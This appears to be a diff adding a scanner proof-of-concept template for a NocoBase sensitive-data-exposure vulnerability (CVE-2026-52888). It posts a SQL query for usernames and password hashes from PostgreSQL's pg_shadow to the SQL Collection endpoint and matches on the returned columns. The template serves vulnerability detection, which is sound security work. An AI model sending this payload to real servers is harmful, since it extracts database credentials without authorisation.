@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "通过 SQL Collection 接口查询 PostgreSQL 系统表 pg_shadow 以验证敏感信息泄露漏洞"
+id = "POC-AVE-2026-0704"
+name = "NocoBase Sensitive Data Exposure PoC"
+severity = "medium"
+tags = ["ave-2026-0704"]
+vuln_id = [
+    "CVE-2026-52888",
+    "AVE-2026-0704",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/sqlCollection:execute"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"sql": "SELECT usename, passwd FROM pg_shadow"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "passwd",
+    "usename",
+]
